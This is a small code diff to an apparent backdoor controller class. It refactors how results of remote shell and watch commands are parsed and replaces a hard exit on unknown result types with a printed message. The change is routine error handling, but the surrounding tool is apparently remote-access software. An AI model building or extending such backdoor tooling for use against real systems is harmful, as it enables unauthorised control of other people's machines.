@@ -492,13 +492,16 @@ class BackdoorClient(object):
 
         result_type = ord(result_bytes[0])
 
+        result = None
+
         if result_type == command.Command.SHELL:
-            return command.ShellCommand.Result.from_bytes(result_bytes)
+            result = command.ShellCommand.Result.from_bytes(result_bytes)
         elif result_type == command.Command.WATCH:
-            return command.WatchCommand.Result.from_bytes(result_bytes)
+            result = command.WatchCommand.Result.from_bytes(result_bytes)
         else:
             print("Unhandled result type {}".format(result_type))
-            sys.exit(1)
+        
+        return result
 
     def listen_for_results(self):
         """ Open the TCP port and wait for the client to ping """
